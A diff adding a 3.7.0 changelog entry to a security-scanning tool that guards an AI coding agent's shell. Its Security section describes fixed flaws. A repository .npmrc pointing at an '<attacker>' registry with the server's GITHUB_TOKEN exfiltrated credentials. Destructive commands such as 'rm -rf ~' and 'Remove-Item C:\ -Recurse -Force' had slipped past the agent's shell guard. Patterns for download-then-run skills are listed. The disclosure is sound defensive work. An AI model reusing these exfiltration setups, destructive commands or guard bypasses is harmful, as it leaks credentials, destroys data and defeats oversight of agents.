@@ -8,6 +8,124 @@ version bump.
 
 ## [Unreleased]
 
+## [3.7.0] - 2026-10-27
+
+What the 3.6.1 review left open, each measured before it was closed: a scanned repository's package-manager config
+could still send the user's credentials where it chose, the CI pipelines installed unhashed Python dependencies,
+and the push-run history pass left two kinds of change unread.
+
+### Upgrading from 3.6.1
+
+- **`deps_audit` no longer runs `npm audit` in the repository.** It audits a temporary copy of `package.json` and
+  its lock files, so a repository `.npmrc` / `.pnpmrc` / `.yarnrc` / `.yarnrc.yml` is never read — the result names
+  them in `package_config_not_read`, with the registry the project's `.npmrc` named. A private registry the
+  project needs belongs in your own `~/.npmrc`. A network-path dependency, or a file npm reads that could not be
+  checked for one, makes npm a named gap.
+- **Package managers get an allowlisted environment.** `npm audit`, `pip-audit`, `dotnet restore` and `dotnet list
+  package` (outside `create_fix_pr` too), and `scan_sast`'s .NET restore and build, run with the package managers'
+  allowlist instead of the server's environment: `DOTNET_*`, `NUGET_*`, `NuGetPackageSourceCredentials_*`, `NODE_*`,
+  `PYTHON*` and the home and temp directories pass, a token or a `GUARDIAN_*` variable does not.
+- **A .NET restore can be refused.** A repository `NuGet.config` that declares a feed under a name you hold a
+  credential for, on another server, refuses the restore as a named gap (`nuget_credential_rebound`), and so does a
+  project that keeps `RestoreConfigFile`, `RestoreRootConfigDirectory` or `RestoreSolutionDirectory` with
+  `TreatAsLocalProperty` (`nuget_config_redirected`). Every restore passes those three properties empty.
+- **No .NET SDK telemetry**: every `dotnet` dev-guardian starts runs with `DOTNET_CLI_TELEMETRY_OPTOUT=1` and
+  `DOTNET_NOLOGO=1`, over any value you set.
+- **Trivy scans Maven offline.** Every `trivy fs`-family scan passes `--offline-scan`: a pom's transitive
+  dependencies are not resolved, only its direct ones, and that is a named partial gap (`trivy:maven-offline`)
+  whenever Trivy read a pom. Lock-based ecosystems are unaffected.
+- **CI templates**: regenerate with `ci-init`. The pipelines now install bandit, Semgrep and zizmor into a venv
+  from a lock per Python the images run (`configs/ci/python/{3.12,3.13,3.14}/requirements.txt`, every dependency
+  sha256-hashed, `pip install --require-hashes --only-binary :all:`); an image whose Python has no lock (3.11, say)
+  stops the job, naming it. The old pipelines keep working.
+- **The shell guard asks more**: deleting or moving Claude Code's settings from the shell — the file, a glob that
+  could match it, the `.claude` directory, `git rm`, `find … -delete` — is now a question
+  (`claude-settings-remove`).
+- **Spring and ASP.NET routes change shape in `map_attack_surface`.** A route under a literal class-level prefix
+  (`@RequestMapping("/api/orders")`, `[Route("api/[controller]")]`) is reported at its served path, resolved
+  (`path_resolved` = prefix + its own path, `path_partial: false`; `path_raw` stays the method's own). The
+  class-level `@RequestMapping` is no longer a route of its own — one row fewer per prefixed controller, and a Java
+  project whose only "route" was one now reads `no_matches`. A bare `[HttpGet]` / `@GetMapping` under a prefix is
+  served at the prefix; a Spring handler with no prefix and no supertype is resolved; `[controller]` and `[action]`
+  are replaced; ASP.NET's `~/x` is `/x`. What the join cannot decide — a constant or placeholder prefix, two
+  `[Route]`s, a supertype, `[area]`, `[ActionName]` — stays partial with the route's own path. Cached surfaces are
+  recomputed (the cache key holds the pack's hash). The routes pack grows from 64 to 73 rules (`guardian_kind:
+  scope`, `guardian_class_prefix: spring | aspnet` in the pack contract).
+- **zod 4.** A refused tool call's -32602 / `invalid_input` text is now zod 4's — "Required" reads `Invalid input:
+  expected string, received undefined`, an unknown key `Unrecognized key: "x"`, a bad scan id `Invalid GUID`, a bad
+  `expires_at` `Invalid ISO datetime` — and still names every key. A client matching zod 3's wording must change.
+  The advertised schemas are otherwise identical (draft-07 output, `additionalProperties: false` throughout), but
+  six integer parameters with no upper bound (`scan_dast`'s `max_requests`, `timeout_ms`, `wall_clock_ms`;
+  `llm_scan`'s `max_tasks`, `max_estimated_tokens`, `per_task_overhead`) now advertise and enforce `maximum:
+  9007199254740991`.
+
+### Security
+
+- **`deps_audit` sent the server's token where a repository pointed** (measured on npm 11.20.0): a repository
+  `.npmrc` of `registry=http://<attacker>/` with `_authToken=${GITHUB_TOKEN}` made npm POST the dependency list to
+  the attacker with `Authorization: Bearer <GITHUB_TOKEN>`, and the attacker's `{}` read as a clean audit.
+  pip-audit (pip 26.2.1, a requirements file's index URL) and `dotnet restore` (a `NuGet.config` password of
+  `%GITHUB_TOKEN%`) expanded the same variables. Fixed by the manifest copy and the allowlisted environment above.
+- **NuGet binds a credential to a feed's name, never its URL** (measured on the .NET SDK 10.0.403): a repository
+  `NuGet.config` declaring your feed's name at its own URL received your user name and password, through a
+  `<clear/>` too. Refused before every restore (`scan_sast`, `deps_audit`, `deps_update_plan`, `create_fix_pr`).
+- **A repository's `pom.xml` chose where Trivy fetched** (measured on Trivy 0.74.0): its `<repositories>` or a
+  remote `<parent>` sent every dependency's coordinates to that host, with your `~/.m2/settings.xml` credentials
+  when a `<server>` id matched. Closed by `--offline-scan`.
+- **`scan_sast`'s .NET restore and build ran the project's MSBuild with the server's whole environment** — its
+  `<Exec>` tasks and its packages' analyzers could read a `GITHUB_TOKEN` the server was started with.
+- **The CI pipelines' Python dependencies are hashed**: `pipx install "semgrep==<version>"` pinned three packages
+  and resolved every dependency at job time, after upgrading pipx's own pip from PyPI.
+- **The CI gate's secrets history pass** (on a push, where no full-content pass stands behind it) left unread a
+  file git reads as binary by its content (a NUL byte) and a merge commit's own change (an evil merge): both a
+  one-line AWS key read by no pass, exit 0, measured with gitleaks 8.30.1. Every file is now diffed as text (but a
+  path that held a blob over 1 MiB), and a two-parent merge's own change is a second gitleaks run (`git log --merges
+  --diff-merges=remerge`, git 2.36+); what stays unread — an octopus merge, an older git, the large paths — is
+  named on the run. `docs/ci.md` has the costs measured on Pillow, flask and git.git.
+- **The shell guard** reads a PowerShell `$( … )` inside a double-quoted string or a here-string as PowerShell
+  (`Write-Host "x $(Remove-Item C:\ -Recurse -Force)"` was ok), a braced variable as one word whatever its name
+  holds (`${"}; Remove-Item C:\ …` was ok), and `flock` / `runuser` hand their command on with its quoting intact
+  (`flock /tmp/l bash -c 'rm -rf ~'` was ok).
+- **A hostile repository or skill could hold the server for minutes with crafted text** (measured, each the square
+  of its size or worse): a `NuGet.config` of bare opening tags or one long attribute word (the credential check
+  before every .NET restore: 2.3 s for 320 KB), workspace globs of repeated `**/` or `*a` in `pnpm-workspace.yaml`
+  / `package.json` (`deps_update_plan`, `create_fix_pr`, Trivy's coverage assessment: 3.9 s for eight `**/`), a
+  requirements file of `a[` (`create_fix_pr`'s pip repin), and a skill of thousands of downloads (`scan_skill`'s
+  download-then-run: 23 s for 4 000 lines). Each is read in linear time now. A workspace pattern with more than six
+  `*` now declares its members instead of being a coverage gap, and a skill whose run checks would read more than 64
+  times the file reports a download-then-run rather than nothing.
+- **A crafted skill could hold `scan_skill` for minutes** (measured): a line of `curl`, `wget` or `iwr` words, `curl
+  -O` before a long run of letters, `grep … -q`, a run of `<`, `base64 -d` words, unclosed `<code` / `<pre` tags,
+  `cat` words with no `/`, an MCP manifest's never-closed permission arrays, or a `go.mod` of blank lines each took
+  the square of the file's size (files may be 2 MB; a `go.mod` of 160 000 blank lines took 24 s). All are read in
+  linear time. Two rules are bounded as the rest are: grep's `-q` veto counts within 300 characters of `grep`
+  (beyond that the read is reported), and `base64 -d … | sh` is recognised when the pipe comes within 300
+  characters.
+- `guardian-deps`' no-server fallback no longer tells you to run `npm audit` inside the repository.
+- **The standard Renovate profile** (`init_project`'s `renovate.json`) holds every update 3 days, not only the
+  auto-merged ones: a group, a major or a digest pin opened a PR the day a version was published. Vulnerability
+  alerts keep no floor. An installed copy is refreshed through the config-drift check; the paranoid profile is
+  unchanged.
+- **zod 4.6.7** (from 3.25.76) fixes GHSA-mrhx-c7xc-m3w5 — one issue kept per failing element of an array, even
+  past its `.max()`. 3.6.1's 10 000-item cap on a tool call's lists stays, for a list with no `.max()` or nested in
+  another; it now runs as a preprocess step zod 4 stops at, since zod 4's SDK path no longer calls the method 3.6.1
+  overrode.
+
+### Fixed
+
+- **Rule packs**, measured on code nobody wrote as a fixture (Semgrep 1.182.0, every corpus recorded by tag or
+  sha256 in `docs/maintainers/ablation.md`): bugfix-go's lock-without-defer skips a return a `defer` Unlock covers
+  (Go 1.27.3 `src/`: 39 → 20 findings, the 19 removed all false); bugfix-js' floating-mutation skips a promise pushed
+  into an array or handed to an assertion (Outline + Uptime Kuma: 6 → 2). Base `py-yaml-load`'s four `BaseLoader`
+  exclusions each have a near-miss fixture (two were `DEAD`).
+- **Attack surface (ASP.NET)**: a verb attribute whose arguments are all named — `[HttpGet(Name =
+  "GetWeatherForecast")]`, exactly what `dotnet new webapi` emits, or `[HttpPost(Order = 1)]` — is a route at the
+  controller's path; it matched no rule, so a scaffolded controller reported no endpoint at all. A template passed by
+  name, `[HttpGet(template: "x")]`, is read as the path.
+- **Route parameters**: a brace parameter is read by its name, never its constraint — `{id:int}` gave `int`
+  (ASP.NET, Spring's `{id:[0-9]+}`, Starlette); `{**slug}`, `{id?}` and `{n=1}` give `slug`, `id`, `n`.
+- `guardian-performance` fires on "this endpoint takes seconds".
+
 ## [3.6.1] - 2026-10-25
 
 A full review of 3.6.0 — every area read against the code by its own reviewer, each finding reproduced (by a
